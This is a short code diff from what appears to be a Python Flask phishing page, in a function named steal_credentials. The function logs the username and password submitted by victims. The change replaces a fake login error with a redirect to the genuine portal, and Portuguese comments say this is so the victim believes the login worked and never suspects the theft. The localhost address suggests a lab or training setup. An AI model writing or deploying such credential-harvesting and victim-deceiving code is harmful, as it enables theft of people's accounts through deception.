@@ -143,8 +143,9 @@ def steal_credentials():
         "phishing form POST",
         f"username={username}  password={password}"
     )
-    # Simula erro de login para não levantar suspeitas
-    return render_template("phishing.html", error="Credenciais inválidas. Tente novamente.")
+    # Redireciona para o portal real — a vítima pensa que o login funcionou
+    # e não suspeita que as credenciais foram roubadas
+    return redirect("http://localhost:5001/")
 
 
 # ------------------------------------------------------------------
